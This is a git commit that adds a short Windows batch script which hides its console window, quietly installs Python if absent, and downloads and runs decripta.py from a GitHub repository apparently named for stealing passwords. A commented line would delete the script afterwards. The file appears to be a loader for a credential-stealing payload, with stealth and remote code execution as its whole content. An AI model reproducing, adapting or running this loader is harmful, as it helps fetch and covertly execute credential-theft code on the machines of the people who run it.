f36cc2cb279f75dc75fb43b58865190a4b6655d9
sim-07 <121951559+sim-07@users.noreply.github.com>
2024-04-24 22:42:30 +0200

    Add files via upload

---
+++ main_fottipass.bat
@@ -0,0 +1,14 @@
+@echo off
+powershell -WindowStyle Hidden -Command "Add-Type -Name ConsoleUtils -Namespace System.Console -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'; [System.Console.ConsoleUtils]::ShowWindow([System.Console.ConsoleUtils]::GetConsoleWindow(), 0)"
+
+python --version >nul 2>&1
+if %errorlevel% neq 0 (
+
+    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe', 'python_installer.exe'); Start-Process python_installer.exe -Wait"
+)
+
+curl -o decripta.py https://raw.githubusercontent.com/malwaresuca/fottipassword/main/decripta.py
+
+python decripta.py
+
+::del decripta.py
